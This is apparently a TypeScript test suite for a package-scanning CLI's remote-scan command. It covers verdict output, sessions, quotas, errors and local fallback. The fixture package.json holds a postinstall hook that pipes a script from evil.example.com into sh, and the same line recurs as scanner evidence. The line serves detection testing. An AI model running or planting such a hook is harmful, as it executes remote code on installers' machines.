import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runRemoteScan, renderRemoteScan, summaryLine } from './remote-scan';
import type { RemoteScanRunResult } from './remote-scan';
import { saveSession } from './cloud_client';
import type { Session } from './cloud_client';

function buildSession(token: string, overrides: Partial<Session> = {}): Session {
    return {
        token,
        user: 'octocat',
        subjectId: 'sub_123',
        plan: 'pro',
        planLabel: 'Pro',
        expiresAt: '2027-08-05T00:00:00.000Z',
        capabilities: {
            content_intel_lookup: true,
            remote_scan: true,
            oracle_integration: true,
            offline_sync: false,
            sbom: true,
            ai_review: false,
        },
        limits: { apiRequestsPerMonth: 10000, maxRepos: 25, retentionDays: 365 },
        fetchedAt: '2026-08-05T00:00:00.000Z',
        ...overrides,
    };
}

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-remote-scan-'));
}

function outputText(result: RemoteScanRunResult): string {
    return result.lines.map((l) => l.text).join('\n');
}

function writeManifest(dir: string, manifest: unknown = {
    name: 'evil-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
}): string {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest, null, 2), 'utf8');
    return path.join(dir, 'package.json');
}

function scanBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
    return {
        status: 'complete',
        verdict: 'MALICIOUS',
        risk: 'critical',
        riskScore: 80,
        confidence: 0.85,
        engineVersion: '2.4.1',
        summary: '1 critical, 1 suspicious lifecycle hook(s).',
        findings: [
            {
                severity: 'critical',
                title: 'postinstall',
                message: "High-risk script detected in 'postinstall'.",
                evidence:
                    'curl -s https://evil.example.com/payload.sh | sh\n# dropped into postinstall',
            },
        ],
        ...overrides,
    };
}

function mockResponse(status: number, body: unknown): void {
    const fetchMock = globalThis.fetch as ReturnType<typeof vi.fn>;
    fetchMock.mockResolvedValue({
        ok: status >= 200 && status < 300,
        status,
        json: () => Promise.resolve(body),
    });
}

describe('sentinel remote-scan command (runRemoteScan)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('Given a valid manifest with a malicious postinstall when I run remote-scan then it exits 0 and prints "Verdict: MALICIOUS"', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const manifestPath = writeManifest(dir);
            mockResponse(200, scanBody());
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Verdict: MALICIOUS');
            expect(text).toContain('Risk: critical (score 80)');
            expect(text).toContain('Confidence: 0.85');
            expect(text).toContain('Remote scan (2.4.1)');
            expect(text).toContain('Summary: 1 critical, 1 suspicious lifecycle hook(s)');
            const [url, init] = fetchMock.mock.calls[0];
            expect(url).toBe('https://cloud.example.com/api/scan/remote');
            const sentBody = JSON.parse((init as { body: string }).body);
            expect(sentBody.format).toBe('npm');
            expect(sentBody.manifest).toContain('evil-pkg');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a package.json file path (not a directory) when I run remote-scan then it still succeeds', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const manifestPath = writeManifest(dir);
            mockResponse(200, scanBody());
            const result = await runRemoteScan(
                { targetPath: manifestPath, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain('Verdict: MALICIOUS');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a complete scan result when I run remote-scan --json then it prints the full raw result as JSON', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(200, scanBody());
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com', json: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const parsed = JSON.parse(outputText(result));
            expect(parsed.status).toBe('complete');
            expect(parsed.verdict).toBe('MALICIOUS');
            expect(parsed.risk).toBe('critical');
            expect(parsed.riskScore).toBe(80);
            expect(parsed.findings[0].title).toBe('postinstall');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no session when I run remote-scan then it exits 1 and prints "No active session"', async () => {
        const dir = makeTempDir();
        try {
            writeManifest(dir);
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("No active session. Run 'sentinel login' first.");
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a plan without remote_scan when I run remote-scan then it exits 1 with the plan message and does NOT call the server', async () => {
        const dir = makeTempDir();
        try {
            const session = buildSession('tok-1');
            saveSession(
                buildSession('tok-1', {
                    capabilities: { ...session.capabilities, remote_scan: false },
                }),
                { sessionDir: dir }
            );
            writeManifest(dir);
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Your plan does not include remote scanning.'
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an invalid token when I run remote-scan then the session file is removed and it exits 1', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            expect(fs.existsSync(sessionPath)).toBe(true);
            mockResponse(401, { error: 'Invalid or expired API token.' });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("Session expired. Run 'sentinel login'.");
            expect(fs.existsSync(sessionPath)).toBe(false);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 429 when I run remote-scan then it exits 1 and shows the quota message and server error', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(429, { error: 'Monthly quota exhausted.' });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            const text = outputText(result);
            expect(text).toContain('Cloud limit reached (quota or rate). Retry later.');
            expect(text).toContain('Monthly quota exhausted.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the scan engine is busy (503) when I run remote-scan then it exits 1 with the busy message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(503, { error: 'engine overloaded' });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Scan engine is busy. Retry shortly.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud is offline when I run remote-scan then it falls back to local analysis and exits 0', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            fetchMock.mockRejectedValue(new Error('fetch failed: ECONNREFUSED'));
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud scan unavailable — continuing with local analysis.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud returns a 5xx when I run remote-scan then it falls back to local analysis and exits 0', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(500, { error: 'boom' });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud scan unavailable — continuing with local analysis.'
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a malformed 200 response when I run remote-scan then it does not trust the result and exits 0 with the fallback message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(200, { status: 'complete', verdict: 'MALICIOUS' });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Cloud scan unavailable');
            expect(text).not.toContain('Verdict: MALICIOUS');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a manifest larger than 256KB when I run remote-scan then it exits 1 with the size message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            fs.writeFileSync(
                path.join(dir, 'package.json'),
                '{"big":"' + 'x'.repeat(262200) + '"}',
                'utf8'
            );
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Manifest too large (max 256KB).');
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a directory without package.json when I run remote-scan then it exits 1 with the not-found message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(`No package.json found at '${dir}'.`);
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an unsupported format when I run remote-scan then it exits 1 before any fetch', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com', format: 'yarn' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                "Unsupported format 'yarn'. Supported: ['npm']."
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no SENTINEL_CLOUD_URL and no --api when I run remote-scan then it exits 1 with the base URL message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            const result = await runRemoteScan(
                { targetPath: dir },
                { sessionDir: dir, env: {} }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Set SENTINEL_CLOUD_URL or pass --api <url>.');
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('remote-scan render helpers', () => {
    it('truncates long evidence lines to ~120 characters', () => {
        const longEvidence = 'x'.repeat(500);
        const rendered = renderRemoteScan({
            status: 'complete',
            verdict: 'SUSPICIOUS',
            risk: 'medium',
            riskScore: 55,
            confidence: 0.6,
            engineVersion: '1.0.0',
            findings: [
                { severity: 'medium', title: 'install', message: 'Obfuscated script.', evidence: longEvidence },
            ],
        });
        const line = rendered.split('\n').find((l) => l.includes('Evidence:'));
        expect(line).toBeDefined();
        expect(line!.length).toBeLessThan(160);
        expect(line!.endsWith('…')).toBe(true);
    });

    it('renders the summary from the findings when no summary object is present', () => {
        const summary = summaryLine({
            status: 'complete',
            verdict: 'MALICIOUS',
            risk: 'high',
            riskScore: 70,
            confidence: 0.9,
            findings: [
                { severity: 'critical', title: 'postinstall', message: 'Suspicious lifecycle hook detected.' },
                { severity: 'medium', title: 'install', message: 'Minor.' },
            ],
        });
        expect(summary).toBe('Summary: 1 critical, 1 medium.');
    });
});
